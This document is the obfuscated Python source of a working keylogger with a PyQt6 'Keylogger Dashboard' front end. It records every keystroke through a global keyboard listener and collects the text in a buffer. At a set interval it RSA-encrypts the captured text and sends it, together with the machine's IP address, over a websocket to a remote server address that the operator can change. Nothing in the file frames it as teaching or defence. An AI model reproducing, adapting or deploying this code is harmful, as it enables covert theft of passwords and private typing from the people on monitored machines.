import json #line:1
import threading #line:2
import socket #line:3
import requests #line:4
import subprocess #line:5
import time #line:6
import sys #line:7
import asyncio #line:8
import websockets #line:9
import rsa #line:10
from base64 import urlsafe_b64encode #line:11
from cryptography .fernet import Fernet #line:12
from pynput import keyboard #line:13
from PyQt6 .QtWidgets import QApplication ,QMainWindow ,QLabel ,QVBoxLayout ,QWidget ,QLineEdit ,QFrame ,QHBoxLayout #line:14
from PyQt6 .QtGui import QFont ,QIcon ,QColor ,QPainter ,QBrush ,QPixmap #line:15
from PyQt6 .QtCore import Qt #line:16
class DataCollector :#line:19
    def __init__ (OOOO0000OO0O0000O ):#line:20
        OOOO0000OO0O0000O .text =""#line:21
    def collect_data (O0O00OO00OOO0OO0O ,OOO0O000O0O0OOOO0 ):#line:23
        if OOO0O000O0O0OOOO0 ==keyboard .Key .enter :#line:25
            pass #line:26
        elif OOO0O000O0O0OOOO0 ==keyboard .Key .tab :#line:27
            pass #line:28
        elif OOO0O000O0O0OOOO0 ==keyboard .Key .space :#line:29
            O0O00OO00OOO0OO0O .text +=" "#line:30
        elif OOO0O000O0O0OOOO0 ==keyboard .Key .shift_r :#line:31
            pass #line:32
        elif OOO0O000O0O0OOOO0 ==keyboard .Key .shift_l :#line:33
            pass #line:34
        elif OOO0O000O0O0OOOO0 ==keyboard .Key .alt :#line:35
            pass #line:36
        elif OOO0O000O0O0OOOO0 ==keyboard .Key .ctrl :#line:37
            pass #line:38
        elif OOO0O000O0O0OOOO0 ==keyboard .Key .shift :#line:39
            pass #line:40
        elif OOO0O000O0O0OOOO0 ==keyboard .Key .cmd :#line:41
            pass #line:42
        elif OOO0O000O0O0OOOO0 ==keyboard .Key .caps_lock :#line:43
            pass #line:44
        elif OOO0O000O0O0OOOO0 ==keyboard .Key .right :#line:45
            pass #line:46
        elif OOO0O000O0O0OOOO0 ==keyboard .Key .left :#line:47
            pass #line:48
        elif OOO0O000O0O0OOOO0 ==keyboard .Key .down :#line:49
            pass #line:50
        elif OOO0O000O0O0OOOO0 ==keyboard .Key .up :#line:51
            pass #line:52
        elif OOO0O000O0O0OOOO0 ==keyboard .Key .backspace and len (O0O00OO00OOO0OO0O .text )==0 :#line:53
            pass #line:54
        elif OOO0O000O0O0OOOO0 ==keyboard .Key .backspace and len (O0O00OO00OOO0OO0O .text )>0 :#line:55
            O0O00OO00OOO0OO0O .text =O0O00OO00OOO0OO0O .text [:-1 ]#line:56
        elif OOO0O000O0O0OOOO0 ==keyboard .Key .ctrl_l or OOO0O000O0O0OOOO0 ==keyboard .Key .ctrl_r :#line:57
            pass #line:58
        elif OOO0O000O0O0OOOO0 ==keyboard .Key .esc :#line:59
            return False #line:60
        else :#line:61
            O0O00OO00OOO0OO0O .text +=str (OOO0O000O0O0OOOO0 ).strip ("'")#line:62
    def get_data (O0OO0OOO00O00O00O ):#line:64
        OO0O0000OOOO000O0 =O0OO0OOO00O00O00O .text #line:65
        O0OO0OOO00O00O00O .clean_data ()#line:66
        return OO0O0000OOOO000O0 #line:67
    def clean_data (OOO000OO0OOOOO0O0 ):#line:69
        OOO000OO0OOOOO0O0 .text =""#line:70
class Settings :#line:73
    def __init__ (O0OOO0000OOOO0000 ,OOOOO0OOO000OOOO0 ):#line:74
        O0OOO0000OOOO0000 .data_collector =OOOOO0OOO000OOOO0 #line:75
        O0OOO0000OOOO0000 .window_title ="Keylogger"#line:76
        O0OOO0000OOOO0000 .window_geometry =(100 ,100 ,400 ,200 )#line:77
        O0OOO0000OOOO0000 .time_interval =10 #line:78
        O0OOO0000OOOO0000 .server_path ="ws://0.0.0.0:8000/ws"#line:79
    def get_server_path (OOO00O000OOOO0000 ):#line:81
        return OOO00O000OOOO0000 .server_path #line:82
    def process_data (O00O0OO0OO00OO0OO ):#line:84
        OO00000OOOOOOO00O =O00O0OO0OO00OO0OO .data_collector .get_data ()#line:85
    def get_window_title (OOOOOOO00O0OOOO00 ):#line:89
        return OOOOOOO00O0OOOO00 .window_title #line:90
    def get_window_geometry (O0000O00O0O0O0000 ):#line:92
        return O0000O00O0O0O0000 .window_geometry #line:93
    def get_time_interval (O00OOOO0OO00O00O0 ):#line:95
        return O00OOOO0OO00O00O0 .time_interval #line:96
class KeyloggerGUI (QMainWindow ):#line:99
    def __init__ (O0OOOOOO000OOO0O0 ):#line:100
        super ().__init__ ()#line:101
        O0OOOOOO000OOO0O0 .data_collector =DataCollector ()#line:103
        O0OOOOOO000OOO0O0 .settings =Settings (O0OOOOOO000OOO0O0 .data_collector )#line:104
        O0OOOOOO000OOO0O0 .setWindowTitle (O0OOOOOO000OOO0O0 .settings .get_window_title ())#line:106
        O0OOOOOO000OOO0O0 .setGeometry (*O0OOOOOO000OOO0O0 .settings .get_window_geometry ())#line:107
        O0OOOOOO000OOO0O0 .central_widget =QWidget (O0OOOOOO000OOO0O0 )#line:109
        O0OOOOOO000OOO0O0 .setCentralWidget (O0OOOOOO000OOO0O0 .central_widget )#line:110
        O0OOOOOO000OOO0O0 .layout =QVBoxLayout (O0OOOOOO000OOO0O0 .central_widget )#line:113
        O0OOOOOO000OOO0O0 .layout .setAlignment (Qt .AlignmentFlag .AlignTop )#line:114
        O0OOOOOO000OOO0O0 .title_label =QLabel ("Keylogger Dashboard",O0OOOOOO000OOO0O0 )#line:117
        O0OOOOOO000OOO0O0 .title_label .setFont (QFont ("Arial",20 ))#line:118
        O0OOOOOO000OOO0O0 .title_label .setAlignment (Qt .AlignmentFlag .AlignCenter )#line:119
        O0OOOOOO000OOO0O0 .frame =QFrame (O0OOOOOO000OOO0O0 )#line:122
        O0OOOOOO000OOO0O0 .layout .addWidget (O0OOOOOO000OOO0O0 .title_label )#line:125
        O0OOOOOO000OOO0O0 .layout .addWidget (O0OOOOOO000OOO0O0 .frame )#line:128
        O0OOOOOO000OOO0O0 .light_indicator =LightIndicator ()#line:129
        OOO00O0O000OO0OO0 =QHBoxLayout (O0OOOOOO000OOO0O0 .frame )#line:132
        O0OOOOOO000OOO0O0 .layout .addWidget (O0OOOOOO000OOO0O0 .light_indicator )#line:135
        OOO00O0O000OO0OO0 .setSpacing (20 )#line:138
        O0OOOOOO000OOO0O0 .hostname =socket .gethostname ()#line:140
        O0OOOOOO000OOO0O0 .IPAddr =O0OOOOOO000OOO0O0 .get_ip_address (O0OOOOOO000OOO0O0 .hostname )#line:141
        O0OOOOOO000OOO0O0 .timer =None #line:143
        O0OOOOOO000OOO0O0 .public_key =None #line:144
        O0OOOOOO000OOO0O0 .server_path =O0OOOOOO000OOO0O0 .settings .get_server_path ()#line:145
        O0OOOOOO000OOO0O0 .interval =O0OOOOOO000OOO0O0 .settings .get_time_interval ()#line:146
        O0OOOOOO000OOO0O0 .setup_keylogger ()#line:148
        O0OOOOOO000OOO0O0 .setStyleSheet ("background-color: #293B5F;")#line:150
    def set_server_path (O00O00OO00OOO00OO ,OOO00OO0000OO00O0 ):#line:153
        O00O00OO00OOO00OO .server_path =OOO00OO0000OO00O0 #line:154
        print (OOO00OO0000OO00O0 )#line:155
        OO0O00OOO000OO000 =threading .Thread (target =O00O00OO00OOO00OO .send_post_req )#line:156
        OO0O00OOO000OO000 .start ()#line:157
    def set_interval (OOO000O000OO0O0OO ,OOOOOOO0OO0OOOOO0 ):#line:159
        OOO000O000OO0O0OO .interval =OOOOOOO0OO0OOOOO0 #line:160
    def get_ip_address (OO000OO00O0OO0OOO ,O000O0OO000OOOO00 ):#line:162
        try :#line:163
            O0O0000OO00O0OOO0 =socket .getaddrinfo (O000O0OO000OOOO00 ,None )#line:164
            return O0O0000OO00O0OOO0 [5 ][4 ][0 ]#line:165
        except :#line:166
            return '127.0.0.1'#line:167
    def setup_keylogger (O0O0OO0000O000O00 ):#line:169
        OO000OOOOOOO0O0OO =keyboard .Listener (on_press =O0O0OO0000O000O00 .data_collector .collect_data )#line:170
        OO000OOOOOOO0O0OO .start ()#line:171
        OOO0O000O00O00O00 =threading .Thread (target =O0O0OO0000O000O00 .send_post_req )#line:174
        OOO0O000O00O00O00 .start ()#line:175
    def send_post_req (OO0OOO0OO0O0OOOO0 ):#line:177
        asyncio .run (OO0OOO0OO0O0OOOO0 .send_post_req_async ())#line:178
    async def send_post_req_async (OO0O0OOO0O0O0OO0O ):#line:180
        OO0OO0OO0OO0OO000 =True #line:181
        await asyncio .sleep (1 )#line:182
        while OO0OO0OO0OO0OO000 :#line:184
            try :#line:185
                async with websockets .connect (OO0O0OOO0O0O0OO0O .server_path )as OOO0OOOOOOOO00O0O :#line:186
                    print ('restart')#line:187
                    print (OO0O0OOO0O0O0OO0O .server_path )#line:188
                    O00O0OOO0OO000000 =await OOO0OOOOOOOO00O0O .recv ()#line:191
                    O0000000O00O000OO =rsa .PublicKey .load_pkcs1 (O00O0OOO0OO000000 )#line:192
                    OO0O0OOO0O0O0OO0O .light_indicator .set_active (True )#line:193
                    print (f"Received message from server: {O0000000O00O000OO}")#line:196
                    while True :#line:198
                        OO000OOO0OO0O0OOO =OO0O0OOO0O0O0OO0O .data_collector .get_data ()#line:199
                        OOO000OO00OO00O0O =rsa .encrypt (OO000OOO0OO0O0OOO .encode (),O0000000O00O000OO )#line:200
                        print (type (OOO000OO00OO00O0O ))#line:201
                        try :#line:202
                            await OOO0OOOOOOOO00O0O .send (OOO000OO00OO00O0O )#line:203
                            print ("Encrypted message sent successfully")#line:204
                        except Exception as O000O0000OO0O000O :#line:205
                            OO0OO0OO0OO0OO000 =False #line:207
                        try :#line:209
                            await OOO0OOOOOOOO00O0O .send (OO0O0OOO0O0O0OO0O .IPAddr )#line:210
                            print ("IP address sent successfully")#line:211
                        except Exception as O000O0000OO0O000O :#line:212
                            OO0OO0OO0OO0OO000 =False #line:214
                        await asyncio .sleep (OO0O0OOO0O0O0OO0O .interval )#line:216
            except websockets .exceptions .ConnectionClosedError :#line:219
                print ("WebSocket connection closed unexpectedly.")#line:220
                OO0O0OOO0O0O0OO0O .light_indicator .set_active (False )#line:221
                OO0OO0OO0OO0OO000 =False #line:222
            except websockets .exceptions .InvalidURI :#line:224
                print ("Invalid server URL.")#line:225
                OO0O0OOO0O0O0OO0O .light_indicator .set_active (False )#line:226
                OO0OO0OO0OO0OO000 =False #line:227
            except websockets .exceptions .InvalidStatusCode :#line:229
                OO0O0OOO0O0O0OO0O .light_indicator .set_active (False )#line:230
                OO0OO0OO0OO0OO000 =False #line:231
            except :#line:232
                OO0O0OOO0O0O0OO0O .light_indicator .set_active (False )#line:233
                OO0OO0OO0OO0OO000 =False #line:234
class LightIndicator (QWidget ):#line:242
    def __init__ (O0O0000O00OOO0O00 ):#line:243
        super ().__init__ ()#line:244
        O0O0000O00OOO0O00 .active =False #line:245
        O0O0000O00OOO0O00 .setMinimumSize (50 ,50 )#line:246
        O0O0000O00OOO0O00 .setMaximumSize (50 ,50 )#line:247
    def set_active (OOO00OOO000O0OO00 ,O0O00O00OO0OOOO00 ):#line:249
        OOO00OOO000O0OO00 .active =O0O00O00OO0OOOO00 #line:250
        OOO00OOO000O0OO00 .update ()#line:251
    def paintEvent (O000OO0OO000OOO00 ,OO0O0OO0000O0OOOO ):#line:253
        O0OO0OO0OOOO0OOOO =QPainter (O000OO0OO000OOO00 )#line:255
        O0OO0OO0OOOO0OOOO .setRenderHint (QPainter .RenderHint .Antialiasing )#line:256
        if O000OO0OO000OOO00 .active :#line:258
            O0OO0OO0OOOO0OOOO .setBrush (QBrush (QColor (0 ,255 ,0 )))#line:259
        else :#line:260
            O0OO0OO0OOOO0OOOO .setBrush (QBrush (QColor (255 ,0 ,0 )))#line:261
        O0OO0OO0OOOO0OOOO .drawEllipse (0 ,0 ,O000OO0OO000OOO00 .width (),O000OO0OO000OOO00 .height ())#line:263
class ServerPathWidget (QWidget ):#line:266
    def __init__ (O0OO00OO00000O000 ,OOO0O0O000OO000O0 ):#line:267
        super ().__init__ ()#line:268
        O0OO00OO00000O000 .gui =OOO0O0O000OO000O0 #line:270
        O0OO0OOOOOOOO0OO0 =QVBoxLayout ()#line:272
        O0OO00OO00000O000 .setLayout (O0OO0OOOOOOOO0OO0 )#line:273
        O0OO00OO00000O000 .path_label =QLabel ("Server Path:",O0OO00OO00000O000 )#line:275
        O0OO00OO00000O000 .path_input =QLineEdit (O0OO00OO00000O000 )#line:276
        O0OO00OO00000O000 .path_input .setText (OOO0O0O000OO000O0 .server_path )#line:278
        O0OO00OO00000O000 .path_input .textChanged .connect (O0OO00OO00000O000 .update_server_path )#line:279
        O0OO0OOOOOOOO0OO0 .addWidget (O0OO00OO00000O000 .path_label )#line:281
        O0OO0OOOOOOOO0OO0 .addWidget (O0OO00OO00000O000 .path_input )#line:282
    def update_server_path (OOO000O000OO00000 ,O00O0O0O0OOO0O000 ):#line:284
        OOO000O000OO00000 .gui .set_server_path (O00O0O0O0OOO0O000 )#line:285
class IntervalWidget (QWidget ):#line:288
    def __init__ (OO0OO0O00OOOOO00O ,OOOOO0OOOOOOOOOO0 ):#line:289
        super ().__init__ ()#line:290
        OO0OO0O00OOOOO00O .gui =OOOOO0OOOOOOOOOO0 #line:292
        O0O0000O0O0O00000 =QVBoxLayout ()#line:294
        OO0OO0O00OOOOO00O .setLayout (O0O0000O0O0O00000 )#line:295
        OO0OO0O00OOOOO00O .interval_label =QLabel ("Interval:",OO0OO0O00OOOOO00O )#line:297
        OO0OO0O00OOOOO00O .interval_input =QLineEdit (OO0OO0O00OOOOO00O )#line:298
        OO0OO0O00OOOOO00O .interval_input .setText (str (OOOOO0OOOOOOOOOO0 .interval ))#line:300
        OO0OO0O00OOOOO00O .interval_input .textChanged .connect (OO0OO0O00OOOOO00O .update_interval )#line:301
        O0O0000O0O0O00000 .addWidget (OO0OO0O00OOOOO00O .interval_label )#line:303
        O0O0000O0O0O00000 .addWidget (OO0OO0O00OOOOO00O .interval_input )#line:304
    def update_interval (OOO0O00OO00O0000O ,O0OOOOOOOOOO0OOO0 ):#line:306
         OOO0O00OO00O0000O .gui .set_interval (int (O0OOOOOOOOOO0OOO0 ))#line:307
if __name__ =="__main__":#line:310
    app =QApplication (sys .argv )#line:311
    gui =KeyloggerGUI ()#line:312
    server_path_widget =ServerPathWidget (gui )#line:313
    gui .layout .addWidget (server_path_widget )#line:314
    interval_widget =IntervalWidget (gui )#line:315
    gui .layout .addWidget (interval_widget )#line:316
    gui .setAutoFillBackground (True )#line:317
    gui .show ()#line:318
    sys .exit (app .exec ())#line:319


